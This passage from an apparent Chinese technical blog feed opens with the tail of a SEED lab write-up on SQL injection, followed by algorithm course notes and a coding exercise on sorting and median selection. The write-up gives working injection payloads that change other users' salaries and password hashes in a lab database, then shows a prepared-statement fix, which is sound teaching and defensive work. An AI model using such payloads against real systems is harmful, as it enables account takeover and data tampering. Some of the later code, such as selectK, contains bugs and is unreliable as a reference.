</code></pre><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> credential <span class="keyword">SET</span></span><br><span class="line">	nickname<span class="operator">=</span><span class="string">&#x27;AL&#x27;</span>,</span><br><span class="line">	email<span class="operator">=</span><span class="string">&#x27;a.com&#x27;</span>,</span><br><span class="line">	Salary <span class="operator">=</span> <span class="string">&#x27;30000&#x27;</span></span><br><span class="line">	<span class="keyword">WHERE</span> Name <span class="operator">=</span> <span class="string">&#x27;Alice&#x27;</span>;#.........</span><br></pre></td></tr></table></figure>
<p>​        对上面的注入语句进行执行，可以发现Salary字段已经成功被修改成了30000，并且注入位置的Email也已经被更改。</p>
<p>​                       </p>
<h5 id="Task-3-2-修改他人的工资"><a href="#Task-3-2-修改他人的工资" class="headerlink" title="Task 3.2:修改他人的工资"></a>Task 3.2:修改他人的工资</h5><p>​        这个任务要求我们能够修改其它人的工资数额，上面在PHP代码中我们可以看到，代码并不对用户输入的身份进行password的检查，仅仅是通过where字句匹配到相应的表格内容进行修改，那么我们只需要修改where语句即可完成任务。这里我们还是选择在NickName的位置进行代码注入。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">stupic boss<span class="string">&#x27;,Salary=&#x27;</span><span class="number">1</span><span class="string">&#x27; where Name = &#x27;</span>Boby<span class="string">&#x27;;#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014164529535.png" alt="image-20221014164529535" style="zoom:67%;" /></p>
<p>​             将数据混合代码输入后，我们可以通过绕过password的方式检查注入攻击是否成功，我们进入Boby的Profile界面，可以看到Salary已经改成了1，并且NickName已经改为了注入位置填入的stupid boss。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014164700582.png" alt="image-20221014164700582" style="zoom:67%;" /></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014164825818.png" alt="image-20221014164825818" style="zoom:67%;" /></p>
<h4 id="Task-3-3-修改他人的口令"><a href="#Task-3-3-修改他人的口令" class="headerlink" title="Task 3.3:修改他人的口令"></a>Task 3.3:修改他人的口令</h4><p>​        这里要对Boby的口令进行进一步的修改，这里的难点是数据库存储的并非明文形式的口令，而是口令的哈希值。在更改Profile的PHP代码中可以看出，在输入password后需要进行一步hash运算，如果直接注入明文语句则无法完成这一步，因此我们可以事先将这一步完成，再将Hash后的口令注入。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014165545847.png" alt="image-20221014165545847" style="zoom:67%;" /></p>
<p>​        使用python中的hashlib库来完成sha1运算，并将hashvalue以16进制串进行显示，下面将hashvalue作为password进行注入攻击，注入位置还是在NickName。（这里将Alice作为Boby的口令）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">stupic boss<span class="string">&#x27;,Password = &#x27;</span><span class="number">35318264</span>c9a98faf79965c270ac80c5606774df1<span class="string">&#x27; where Name = &#x27;</span>Boby<span class="string">&#x27;;#</span></span><br></pre></td></tr></table></figure>
<p>​        实施攻击后我们输入Boby的用户名和修改后的口令，发现登录成功。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221015164652914.png" alt="image-20221015164652914" style="zoom:67%;" /></p>
<p>​        我们也可以进入到数据库，使用mysql中的select语句打印出Boby的password，可以看到已经变成了上面运算后的Hashvalue。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014170309216.png" alt="image-20221014170309216"></p>
<h3 id="2-5-Task4：对策：语句预处理"><a href="#2-5-Task4：对策：语句预处理" class="headerlink" title="2.5    Task4：对策：语句预处理"></a>2.5    Task4：对策：语句预处理</h3><p>​        语句预处理可以防止代码和数据进行混淆，在输入之前，代码就已经编译完成，SQL语句将被预编译为二进制形式。语句中只 存在数据的占位符，不存在真实的数据。真实数据将会作为纯数据（不经过编译） 与语句绑定。</p>
<p>​        我们需要对PHP代码进行修改，使用语句预处理机制来修复SQL注入漏洞，首先我们进入相应的URL页面进行访问，我们仍然采用Alice’;#的方式进行绕过，发现可以获取到相应内容。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014190016700.png" alt="image-20221014190016700" style="zoom:67%;" /></p>
<p>​            接下来对相应的PHP语句进行修改，加入语句预处理机制，这里由于SQL注入攻击只存在Query阶段，因此只修改Query段代码即可。这里我们要按照源代码的形式进行修改，并且与页面html代码进行对应。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// do the query</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT id,name,eid, salary,ssn</span></span><br><span class="line"><span class="string">FROM credential</span></span><br><span class="line"><span class="string">WHERE name = ? and Password = ? &quot;</span>);</span><br><span class="line"><span class="comment">//从credential表里提取信息，需要对用户名和口令进行匹配</span></span><br><span class="line"><span class="comment">// Bind parameters to the query</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$input_uname</span>, <span class="variable">$hashed_pwd</span>);</span><br><span class="line"><span class="comment">//ss表示两个字段都是字符串类型</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="comment">//运行sql语句</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$id</span>,<span class="variable">$name</span>,<span class="variable">$eid</span>,<span class="variable">$salary</span>,<span class="variable">$ssn</span>);</span><br><span class="line"><span class="comment">//绑定结果到变量</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​            修改过后重新进行dcbulid和dcup操作，进入web页面输入相应的SQL注入语句，发现无信息返回，攻击防范成功。</p>
<p>​                            <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221015170623426.png" alt="image-20221015170623426" style="zoom:67%;" /></p>
<h3 id="4-思考题"><a href="#4-思考题" class="headerlink" title="4    思考题"></a>4    思考题</h3><p>​    假设数据库只存储 password 和 eid 两列的 SHA256 值。使用下面 SQL 语句与数据库交互，其中 $passwd 和 $eid 变量的值由用户提供。这个程序是否存在 SQL 注入问题？如果没有，请解释原因；如果 有，请给出构造范例。</p>
<p>​    显然这个还是可以进行SQL注入的，因为hash的语句是在SQL语句中的，参数还是可以进行拼接的,可以在eid位置注入1，256)’and 1=1#,使代码完成下面的操作。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM employee</span></span><br><span class="line"><span class="string">WHERE eid=&#x27;SHA2(1, 256)&#x27; and 1=1 #password=&#x27;SHA2(<span class="subst">$passwd</span>, 256)&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>​        如果想要防御这样的攻击，可以将sql语句和hash运算分离，使代码首先完成hash运算，这样恶意输入不会影响sql语句。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hashed_eid</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$eid</span>);</span><br><span class="line"><span class="variable">$hashed_passwd</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$passwd</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM employee WHERE id= &#x27; $ hashhed_eid &#x27; and password= &#x27;$ hashhed_passwd&#x27;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>seedlab</category>
      </categories>
      <tags>
        <tag>seedlab</tag>
      </tags>
  </entry>
  <entry>
    <title>Design and Analysis of Algorithms1</title>
    <url>/2023/01/09/algorithm1-1/</url>
    <content><![CDATA[<p>该系列文章是复习算法分析与设计课程的内容，截图均来自该课程，供大家学习和参考.</p>
<h2 id="lecture-1"><a href="#lecture-1" class="headerlink" title="lecture 1"></a>lecture 1</h2><h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><h5 id="1-Return-on-investment（ROI）"><a href="#1-Return-on-investment（ROI）" class="headerlink" title="1.Return on investment（ROI）"></a>1.Return on investment（ROI）</h5><p>首先是投资回报问题，这个问题的也就是m个coins投资到n个项目，来使汇报最大，这里会给一个矩阵，也就是项目投资回报矩阵</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230109115245844.png" alt="image-20230109115245844"></p>
<p>首先想到的是通用的Brute-Force算法，也就是会直接的搜索所有的可能来找到投资的最大值.</p>
<p>​    使用该算法的一个问题是如何来遍历所有的可能性，对于这个问题，显然问题的解是一个非负向量，也就是这里可以采用离散数学中的隔板法来求解，也就是这里给定m个1，n-1个0，其中n是项目数量，那么n-1个0可以把m个数分成n份非负，如果 加上限制条件每一个项目都需要投资的话，这就是这个问题的一个变体，那么就可以将这个分组问题进行转化，比如说还是m个coins分为n组，但是现在实际上转化为m+n个coins进行非负分组。</p>
<p>​    那么这个问题最终就可以按照组合数公式进行计算，显然这个结果是指数级别的，并不高效</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230109203537403.png" alt="image-20230109203537403"></p>
<h5 id="2-Single-Machine-Scheduling-Problem"><a href="#2-Single-Machine-Scheduling-Problem" class="headerlink" title="2.Single Machine Scheduling Problem"></a>2.Single Machine Scheduling Problem</h5><p>这是单机调度问题，也就是n个任务，每一个任务需要t时间去完成，单机调度也就是去求n个任务最小的flowtime.</p>
<p>lowtime of task i: starti = 0, endi − starti ≥ ti</p>
<p>Greedy algorithm是一种启发式算法(heuristic algorithm)</p>
<p>启发式算法也就是最初来自于直觉的算法</p>
<p>那么对于这个问题，我们可以使用短进程优先的方式，也就是先对运行时间进行排序，然后按顺序执行.</p>
<p>对于贪心算法很重要的一点也就是证明，下面给出Proof</p>
<p>可以使用反证法来证明，也就是首先假设我们得到的算法解不是最优解，那么就存在最优解$I^*$有至少一个的反序，也就是任务i和任务j是邻近的(adjacent)但是$t_i&gt;t_j$那么就可以降这两个任务进行交换得到$I’$</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230109214736322.png" alt="image-20230109214736322"></p>
<p>那么这时候可以比较它们的flowtime:$T(I’)-T(I^*)=t_j-t_i&lt;0$，就产生矛盾</p>
<p><strong>注意</strong>：启发式算法并不总是正确的，对于下面的问题采用单位价值最大的方法无法得到最优解</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230109215313115.png" alt="image-20230109215313115"></p>
<h3 id="算法设计流程"><a href="#算法设计流程" class="headerlink" title="算法设计流程"></a>算法设计流程</h3><p>1.建模：给出对于描述的输入，输出和目标函数</p>
<p>2.设计：如何设计算法，使用什么算法，如何描述问题</p>
<p>3.证明：证明算法对于所有情况是正确的(给出反例?)</p>
<p>4.分析:时间复杂度和空间按复杂度</p>
<h3 id="从排序开始"><a href="#从排序开始" class="headerlink" title="从排序开始"></a>从排序开始</h3><h4 id="1-插入排序"><a href="#1-插入排序" class="headerlink" title="1.插入排序"></a>1.插入排序</h4><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230109215749592.png" alt="image-20230109215749592"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insertion_sort</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums,<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=i;j&gt;<span class="number">0</span>&amp;&amp;nums[j]&lt;nums[j<span class="number">-1</span>];--j)&#123;</span><br><span class="line">            <span class="built_in">swap</span>(nums[j],nums[j<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n),n)&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;nums;</span><br><span class="line">        nums.<span class="built_in">resize</span>(n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            cin&gt;&gt;nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">insertion_sort</span>(nums,n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            cout&lt;&lt;nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>复杂性分析：</p>
<p>最坏情况：$O(n^2)$这时候数组完全反序，元素会$n^2$次比较和交换</p>
<p>最好情况:最好情况下就是有序数组，时间复杂度也就是$O(n)$比较(只和第一个元素比较)，$O(1)$交换</p>
<p>平均情况和最坏一致，这里如果使用链表的形式的话，就可以将交换的时间减少，但是比较的时间并不能减少</p>
<h4 id="2-冒泡排序-Bubble-Sort"><a href="#2-冒泡排序-Bubble-Sort" class="headerlink" title="2.冒泡排序(Bubble Sort)"></a>2.冒泡排序(Bubble Sort)</h4><p>bubble sort是冒泡排序，通过遍历整个串，然后比较相邻两个元素并交换它们</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230110105650803.png" alt="image-20230110105650803"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BubbleSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums,<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="type">bool</span> swapped;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        swapped = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;n-i<span class="number">-1</span>;++j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[j]&lt;nums[j<span class="number">-1</span>])&#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[j],nums[j<span class="number">-1</span>]);</span><br><span class="line">                swapped = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(swapped==<span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n)!=EOF)&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">        nums.<span class="built_in">resize</span>(n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            cin&gt;&gt;nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">BubbleSort</span>(nums, n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            cout&lt;&lt;nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>复杂度分析：</p>
<p>最坏情况：$O(n^2)$的比较和交换</p>
<p>最好情况：数组在有序情况，第一遍扫完不需要交换，$O(n)$比较和$O(1)$交换</p>
<p>平均情况：$O(n^2)$比较和交换</p>
<p>冒泡排序的有点是稳定和简单的，但是并不高效</p>
<h4 id="3-快速排序-QuickSort"><a href="#3-快速排序-QuickSort" class="headerlink" title="3.快速排序(QuickSort)"></a>3.快速排序(QuickSort)</h4><p>1.选择一个元素，作为支点元素</p>
<p>2.将数组分为小于支点元素和大于支点元素的两部分</p>
<p>显然快速排序是一个分治算法，这里交换使用的是双指针的方式</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230110112024071.png" alt="image-20230110112024071"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l+<span class="number">1</span>&gt;r)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> first=l,last=r<span class="number">-1</span>,key=nums[first];</span><br><span class="line">    <span class="keyword">while</span> (first&lt;last) &#123;</span><br><span class="line">        <span class="keyword">while</span>(first&lt;last&amp;&amp;nums[last]&lt;=key)&#123;</span><br><span class="line">            --last;</span><br><span class="line">        &#125;</span><br><span class="line">        nums[first]=nums[last];</span><br><span class="line">        <span class="keyword">while</span> (last&gt;first&amp;&amp;nums[first]&gt;=key) &#123;</span><br><span class="line">            ++first;</span><br><span class="line">        &#125;</span><br><span class="line">        nums[last]=nums[first];</span><br><span class="line">    &#125;</span><br><span class="line">    nums[first]=key;</span><br><span class="line">    <span class="built_in">QuickSort</span>(nums,l,first);</span><br><span class="line">    <span class="built_in">QuickSort</span>(nums, first+<span class="number">1</span>,r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n),n) &#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">        nums.<span class="built_in">resize</span>(n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            cin&gt;&gt;nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">QuickSort</span>(nums,<span class="number">0</span>,n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            cout&lt;&lt;nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最坏情况：$O(n^2)$ 比较和交换，在所有元素有序或者是无序情况下</p>
<p>最好情况：$O(nlogn)$比较和$O(1)$交换</p>
<p>平均情况:$O(nlogn)$比较和交换</p>
<p>优点：快速，可以调用相应的库函数入qsort</p>
<p>缺点：不稳定，支点元素可能会影响表现</p>
<h4 id="4-归并排序-Merge-Sort"><a href="#4-归并排序-Merge-Sort" class="headerlink" title="4.归并排序(Merge Sort)"></a>4.归并排序(Merge Sort)</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums,<span class="type">int</span> l,<span class="type">int</span> r,vector&lt;<span class="type">int</span>&gt; &amp;temp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l+<span class="number">1</span>&gt;=r)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> m = l+(r-l)/<span class="number">2</span>;</span><br><span class="line">    <span class="comment">//divide</span></span><br><span class="line">    <span class="built_in">MergeSort</span>(nums,l,m,temp);</span><br><span class="line">    <span class="built_in">MergeSort</span>(nums,m,r,temp);</span><br><span class="line">    <span class="comment">//conquer</span></span><br><span class="line">    <span class="type">int</span> p=l,q=m,i=l;</span><br><span class="line">    <span class="comment">//the loop end until the two list end</span></span><br><span class="line">    <span class="keyword">while</span>(p&lt;m||q&lt;r)&#123;</span><br><span class="line">        <span class="keyword">if</span>(q&gt;=r||(p&lt;m&amp;&amp;nums[p]&lt;=nums[q]))&#123;</span><br><span class="line">            temp[i++]=nums[p++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            temp[i++]=nums[q++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=l;i&lt;r;i++)&#123;</span><br><span class="line">        nums[i]=temp[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>复杂度分析:在任何情况下都是$O(nlog n)$但是需要n的空间复杂度</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230110225620965.png" alt="image-20230110225620965"></p>
<h3 id="复杂性理论"><a href="#复杂性理论" class="headerlink" title="复杂性理论"></a>复杂性理论</h3><p>TSP（旅行商问题）NP-hard问题</p>
<p>Knapsck问题 NP-complete问题</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Design and Analysis of Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>算法刷题1</title>
    <url>/2022/12/12/algorithm1/</url>
    <content><![CDATA[<h3 id="1-Who’s-in-the-Middle"><a href="#1-Who’s-in-the-Middle" class="headerlink" title="1.Who’s in the Middle"></a>1.Who’s in the Middle</h3><p><strong>Description</strong>：FJ is surveying his herd to find the most average cow. He wants to know how much milk this ‘median’ cow gives: half of the cows give as much or more than the median; half give as much or less.</p>
<p>Given an odd number of cows N (1 &lt;= N &lt; 10,000) and their milk output (1..1,000,000), find the median amount of milk given such that at least half the cows give the same amount of milk or more and at least half give the same or less.</p>
<p><strong>Input</strong></p>
<p>* Line 1: A single integer N</p>
<p>* Lines 2..N+1: Each line contains a single integer that is the milk output of one cow.</p>
<p><strong>Output</strong></p>
<p>* Line 1: A single integer that is the median milk output.</p>
<h5 id="解法1：排序解法"><a href="#解法1：排序解法" class="headerlink" title="解法1：排序解法"></a>解法1：排序解法</h5><p>​    对于这个问题，其实是让我们找到牛奶产量的中位数，这里我们可以使用C语言中的Algorithm库对输入的产奶量直接进行排序，然后将中间位置的元素直接进行输出。具体代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10000</span>];</span><br><span class="line">    <span class="type">int</span> N,i;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N)!=EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        sort(a,a+N);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a[N/<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="解法二：分治算法"><a href="#解法二：分治算法" class="headerlink" title="解法二：分治算法"></a>解法二：分治算法</h5><p>​    这个题目我们也可以使用分治算法进行求解，其基本思想是在数组中先选择第一个元素作为标准元素，然后定义三个数组，分别用来存储大于、小于和等于标准元素的元素。然后对k的大小进行判断，如果k在小于标准元素的数组中，那么只需要对small数组进行求解。如果k在等于标准元素的数组中，那么k就是标准元素，如果k在大于标准元素的数组中，那么就可以减小k的规模来递归求解。该算法的平均时间复杂度是O(nlogn)，但是在一些特殊情况下(互不相等的递增数列)，时间复杂度会来到$n^2$.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">selectK</span><span class="params">(<span class="type">int</span> a[],<span class="type">int</span> length,<span class="type">int</span> k)</span>&#123;</span><br><span class="line">    <span class="type">int</span> *small = (<span class="type">int</span>*)<span class="built_in">malloc</span>(length*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="type">int</span> *equal = (<span class="type">int</span>*)<span class="built_in">malloc</span>(length*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="type">int</span> *large = (<span class="type">int</span>*)<span class="built_in">malloc</span>(length*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="comment">//定义三部分，大于中位数的小于的和等于的</span></span><br><span class="line">    <span class="type">int</span> Nums,Numl,Nume = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> value = a[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">//选择数组的第一个元素</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]==value)</span><br><span class="line">        &#123;</span><br><span class="line">            equal[Nume]=a[i];</span><br><span class="line">            Nume++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i]&lt;value)</span><br><span class="line">        &#123;</span><br><span class="line">            small[Nums] = a[i];</span><br><span class="line">            Nums++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            large[Numl]=a[i];</span><br><span class="line">            Numl++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(k&lt;Nums) <span class="keyword">return</span> selectK(small,Nums,k);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(k&gt;Nume+Nums) <span class="keyword">return</span>(large,Numl,k-Nume-Nums);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> value; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> N;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10000</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N)!=EOF)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,selectK(a,N,(<span class="type">int</span>)(N/<span class="number">2</span>)+<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
